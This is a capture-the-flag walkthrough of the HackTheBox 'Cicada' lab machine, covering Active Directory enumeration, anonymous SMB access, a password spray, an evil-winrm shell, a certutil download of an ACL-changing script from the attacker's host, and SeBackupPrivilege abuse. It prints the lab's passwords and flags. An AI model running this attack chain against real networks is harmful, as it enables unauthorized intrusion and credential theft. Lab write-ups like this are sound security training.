# :game_die: Cicada-HTB-Walkthrough-By-Reju-Kole

---

# Cicada-HTB-Walkthrough-By-Reju-Kole

*CicadaWelcome! It is time to look at the Cicada machine on HackTheBox. I am making these walkthroughs to keep myself motivated to learn cyber security and ensure that I remember the knowledge gained by playing HTB machines.Join me on learning cyber security. I will try and explain concepts as I go, to differentiate myself from other walkthroughs.*Level — EasyMachine URL : [Hack The Box :: Hack The Box](https://app.hackthebox.com/machines/Cicada)

About Cicada — *Cicada is an easy-difficult Windows machine that focuses on beginner Active Directory enumeration and exploitation. In this machine, players will enumerate the domain, identify users, navigate shares, uncover plaintext passwords stored in files, execute a password spray, and use the `SeBackupPrivilege` to achieve full system compromise.Machine Matrix*

## Enumeration

*To kick off this box, let’s run a Nmap scan to see what services and ports are open.*

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A 10.10.11.35
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 17:14 EST
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.47s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-08 05:15:10Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after: 2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after: 2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after: 2025-08-22T20:24:16
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after: 2025-08-22T20:24:16
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled and required
| smb2-time:
| date: 2024-11-08T05:16:19
|_ start_date: N/A
|_clock-skew: 7h00m03s

TRACEROUTE (using port 53/tcp)
HOP RTT ADDRESS
1 500.91 ms 10.10.16.1
2 501.02 ms cicada.htb (10.10.11.35)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.42 seconds
```

*The scan shows that the ports for TCP (53) & DNS Service are open and running as Simple DNS Plus, TCP (88) is open with the Kerberos service, TCP (135) is open and running Microsoft Windows RPC, TCP (139) is open with NetBIOS-SSN, TCP (389) & LDAP Service is running for Microsoft Windows Active Directory, and TCP (445) is open for Microsoft-DS. The ports TCP (464), TCP (593) for RPC over HTTP, TCP (636) & SSL/LDAP, and TCP (3268), and TCP (3269) are also open, running various Active Directory services.*

>

Let’s add Cicada host to our /etc/hosts file.

```
sudo echo "10.10.11.35 cicada.htb" | sudo tee -a /etc/hosts
```

## ENUMERATING SMB

### 1. Explore SMB Shares with smbclient

```
┌──(kali㉿kali)-[~]
└─$ smbclient -L //10.10.11.35
Password for [WORKGROUP\kali]: anonymous

Sharename Type Comment
--------- ---- -------
ADMIN$ Disk Remote Admin
C$ Disk Default share
DEV Disk
HR Disk
IPC$ IPC Remote IPC
NETLOGON Disk Logon server share
SYSVOL Disk Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.35 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

*Displays accessible SMB shares on the target host.*

### 2. Access the `HR` Share with SMBv2

```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.11.35/HR -U '' -m SMB2
Password for [WORKGROUP\]: anonymous
Try "help" to get a list of possible commands.
smb: \> ls
. D 0 Thu Mar 14 08:29:09 2024
.. D 0 Thu Mar 14 08:21:29 2024
Notice from HR.txt A 1266 Wed Aug 28 13:31:48 2024

4168447 blocks of size 4096. 415018 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \>
```

*Access the HR share with anonymous login, enforcing the SMBv2 protocol.*

```
┌──(kali㉿kali)-[~]
└─$ cat 'Notice from HR.txt'

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

*Inside of Notice from HR.txt.*

### 3. Read `Notice from HR.txt` for Credentials

*For details on the credentials for user michael.wrightson, please consult the ‘Notice from HR.txt’ file.*

## Enumerating Users

### 4. Enumerate Users via RID Bruteforce Using crackmapexec

*Our goal is to discover domain users by performing a brute force on the RID.*

```
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb cicada.htb -u anonymous -p '' --rid-brute
SMB cicada.htb 445 CICADA-DC [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB cicada.htb 445 CICADA-DC [+] cicada.htb\anonymous:
SMB cicada.htb 445 CICADA-DC [+] Brute forcing RIDs
SMB cicada.htb 445 CICADA-DC 498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 500: CICADA\Administrator (SidTypeUser)
SMB cicada.htb 445 CICADA-DC 501: CICADA\Guest (SidTypeUser)
SMB cicada.htb 445 CICADA-DC 502: CICADA\krbtgt (SidTypeUser)
SMB cicada.htb 445 CICADA-DC 512: CICADA\Domain Admins (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 513: CICADA\Domain Users (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 514: CICADA\Domain Guests (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 515: CICADA\Domain Computers (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 516: CICADA\Domain Controllers (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 517: CICADA\Cert Publishers (SidTypeAlias)
SMB cicada.htb 445 CICADA-DC 518: CICADA\Schema Admins (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 519: CICADA\Enterprise Admins (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 525: CICADA\Protected Users (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 526: CICADA\Key Admins (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB cicada.htb 445 CICADA-DC 571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB cicada.htb 445 CICADA-DC 572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB cicada.htb 445 CICADA-DC 1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB cicada.htb 445 CICADA-DC 1101: CICADA\DnsAdmins (SidTypeAlias)
SMB cicada.htb 445 CICADA-DC 1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 1103: CICADA\Groups (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 1104: CICADA\john.smoulder (SidTypeUser)
SMB cicada.htb 445 CICADA-DC 1105: CICADA\sarah.dantelia (SidTypeUser)
SMB cicada.htb 445 CICADA-DC 1106: CICADA\michael.wrightson (SidTypeUser)
SMB cicada.htb 445 CICADA-DC 1108: CICADA\david.orelious (SidTypeUser)
SMB cicada.htb 445 CICADA-DC 1109: CICADA\Dev Support (SidTypeGroup)
SMB cicada.htb 445 CICADA-DC 1601: CICADA\emily.oscars (SidTypeUser)
```

*Here, we’ve gathered several usernames. Let’s try to validate them using the password we discovered.I saved all the usernames in a text file and conducted a password spray.*

```
crackmapexec smb 10.10.11.35 -u username.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

*We successfully identified a user who is using the password we discovered.Next, we’ll attempt lateral movement to locate a user with higher privileges.*

```
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB 10.10.11.35 445 CICADA-DC [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB 10.10.11.35 445 CICADA-DC [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB 10.10.11.35 445 CICADA-DC [+] Enumerated domain user(s)
SMB 10.10.11.35 445 CICADA-DC cicada.htb\emily.oscars badpwdcount: 0 desc:
SMB 10.10.11.35 445 CICADA-DC cicada.htb\david.orelious badpwdcount: 0 desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
SMB 10.10.11.35 445 CICADA-DC cicada.htb\michael.wrightson badpwdcount: 0 desc:
SMB 10.10.11.35 445 CICADA-DC cicada.htb\sarah.dantelia badpwdcount: 2 desc:
SMB 10.10.11.35 445 CICADA-DC cicada.htb\john.smoulder badpwdcount: 2 desc:
SMB 10.10.11.35 445 CICADA-DC cicada.htb\krbtgt badpwdcount: 0 desc: Key Distribution Center Service Account
SMB 10.10.11.35 445 CICADA-DC cicada.htb\Guest badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB 10.10.11.35 445 CICADA-DC cicada.htb\Administrator badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

*We discovered a user whose password is stored in their account description.*

## Get Reju Kole’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

*Then run *`*smbmap*`* to verify if this user has access to additional shares, and it turns out they do have access to several more shares.*

```
smbmap -H 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
```

```
[-] Enumerating shares... [\] Enumerating shares...
[+] IP: 10.10.11.35:445 Name: cicada.htb Status: Authenticated
Disk Permissions Comment
---- ----------- -------
ADMIN$ NO ACCESS Remote Admin
C$ NO ACCESS Default share
DEV READ ONLY
HR READ ONLY
IPC$ READ ONLY Remote IPC
NETLOGON READ ONLY Logon server share
SYSVOL READ ONLY Logon server share
[|] Closing connections.. [/] Closing connections..
```

*We examine the ‘DEV’ share and find a PowerShell script named *`*Backup_script.ps1*`*.*

```
smbclient \\\\10.10.11.35\\DEV -U 'david.orelious' -N 'aRt$Lp#7t*VQ!3'
```

```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.11.35\\DEV -U 'david.orelious' -N 'aRt$Lp#7t*VQ!3'
Try "help" to get a list of possible commands.
smb: \> ls
. D 0 Thu Mar 14 08:31:39 2024
.. D 0 Thu Mar 14 08:21:29 2024
Backup_script.ps1 A 601 Wed Aug 28 13:28:22 2024

4168447 blocks of size 4096. 429199 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \>
```

*Upon inspecting the contents of *`*Backup_script.ps1*`*, we uncover a new username and password!*

```
┌──(kali㉿kali)-[~]
└─$ cat Backup_script.ps1

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

## Getting the shell

### User.txt

*After enumerating the shares with our newly found credentials and finding no additional access, we decide to try obtaining a shell using *`*evil-winrm*`*.*

```
evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

*We successfully gain a shell!*

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls

Directory: C:\Users\emily.oscars.CICADA\Desktop

Mode LastWriteTime Length Name
---- ------------- ------ ----
-ar--- 11/8/2024 2:26 PM 34 user.txt

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami
cicada\emily.oscars
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
47cb26e784f790b49e8b1a0a7fc7d96d
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop>
```

>

User.txt — 47cb26e784f790b49e8b1a0a7fc7d96d

## PRIVILEGE ESCALATION

### Root.txt

*We perform basic enumeration to check the privileges our user has on the machine.*

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION

Privilege Name Description State
============================= ============================== =======
SeBackupPrivilege Back up files and directories Enabled
SeRestorePrivilege Restore files and directories Enabled
SeShutdownPrivilege Shut down the system Enabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

*We observe some interesting privileges, and further research leads us to *[abusing tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)*.With the help of this, we understand that the ‘SeBackupPrivilege’ can be exploited to gain read access to any file. We can use this to retrieve the root.txt file.After conducting further research, we find this PowerShell script (linked below) that allows us to access the root.txt file.*

[Acl-FullControl.ps1 — GitHub](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)

*We begin by transferring the script to the target computer using our Python server and the following command.*

```
certutil -urlcache -f http://10.10.16.78:80/FullControl.ps1 FullControl.ps1
```

*You need to run a Python server on your Kali machine and execute this command on the victim’s Evil-WinRM terminal.*

```

YOUR KALI TERMINAL

┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.35 - - [08/Nov/2024 10:55:54] "GET /FullControl.ps1 HTTP/1.1" 200 -
10.10.11.35 - - [08/Nov/2024 10:55:56] "GET /FullControl.ps1 HTTP/1.1" 200 -

VICTIM WINDOWS TERMINAL

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> certutil -urlcache -f http://10.10.16.78:80/FullControl.ps1 FullControl.ps1
Online
CertUtil: -URLCache command completed successfully.
```

*I have saved this script as “FullControl.ps1” on my system.Next, we run the script using the following command to gain access to the ‘root.txt’ file.*

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> . .\FullControl.ps1
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> Acl-FullControl -user cicada\emily.oscars -path C:\users\administrator\desktop
[+] Current permissions:

Path : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\desktop
Owner : BUILTIN\Administrators
Group : CICADA\Domain Users
Access : CICADA\emily.oscars Deny FullControl
NT AUTHORITY\SYSTEM Allow FullControl
BUILTIN\Administrators Allow FullControl
CICADA\Administrator Allow FullControl
Audit :
Sddl : O:BAG:DUD:AI(D;OICIID;FA;;;S-1-5-21-917908876-1423158569-3159038727-1601)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA)

[+] Changing permissions to C:\users\administrator\desktop
[+] Acls changed successfully.

Path : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\desktop
Owner : BUILTIN\Administrators
Group : CICADA\Domain Users
Access : CICADA\emily.oscars Allow FullControl
CICADA\emily.oscars Deny FullControl
NT AUTHORITY\SYSTEM Allow FullControl
BUILTIN\Administrators Allow FullControl
CICADA\Administrator Allow FullControl
Audit :
Sddl : O:BAG:DUD:AI(A;OICI;FA;;;S-1-5-21-917908876-1423158569-3159038727-1601)(D;OICIID;FA;;;S-1-5-21-917908876-1423158569-3159038727-1601)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA)
```

*Now, we can view the contents of the ‘root.txt’ file!*

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cd C:\Users\administrator\Desktop
*Evil-WinRM* PS C:\Users\administrator\Desktop> ls

Directory: C:\Users\administrator\Desktop

Mode LastWriteTime Length Name
---- ------------- ------ ----
-ar--- 11/8/2024 2:26 PM 34 root.txt

*Evil-WinRM* PS C:\Users\administrator\Desktop> cat root.txt
d60a755a174363787542d42dbcf0fd86
*Evil-WinRM* PS C:\Users\administrator\Desktop>
```

>

Root.txt — d60a755a174363787542d42dbcf0fd86

*Hehe!!! Finally, we got the root flag.I hope you enjoyed this writeup! Happy Hacking :)*

>

Subscribe to me on Medium and be sure to turn on email notifications so you never miss out on my latest walkthroughs, write-ups, and other informative posts.

## Follow me on below Social Media:

- *LinkedIn: *[Reju Kole](http://www.linkedin.com/in/reju-kole)

*2. Instagram: *[reju.kole.9](https://www.instagram.com/reju.kole.9?igsh=MW1iZ2w0dXA4bjBxNg%3D)

*3. Respect me On HackTheBox! : *[Hack The Box :: User Profile](https://app.hackthebox.com/users/1671324)

*4. Check My TryHackMe Profile : *[TryHackMe | W40X](https://tryhackme.com/p/W40X)

*5. Twitter | X : *[@Mr_W40X](https://x.com/Mr_W40X)

*6. GitHub : *[W40X | Reju Kole | Security Researcher](https://github.com/W40X)

>

incase you need any help feel free to message me on my social media handles.

---
